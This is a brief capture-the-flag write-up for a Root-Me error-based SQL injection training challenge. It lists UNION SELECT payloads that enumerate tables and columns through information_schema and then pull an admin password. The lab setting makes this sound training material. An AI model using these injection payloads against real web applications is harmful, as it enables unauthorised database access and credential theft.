## Challenge name: SQL injection - Error

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error)

**Use `ORDER BY` to determine the number of columns (3). Then use `CAST` to trigger SQL errors and extract data:**

**Extract table names:**
```
1 UNION SELECT 1, CAST((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) AS CHAR), 3
```

**Extract column names:**
```
1 UNION SELECT 1, CAST((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='m3mbr35t4bl3') AS CHAR), 3
```

**Extract admin password:**
```
1 UNION SELECT 1, CAST((SELECT p455w0rd_c0l FROM m3mbr35t4bl3 LIMIT 1) AS CHAR), 3
```

**Use the captured flag/password to validate the challenge.**

**Thankyou.**
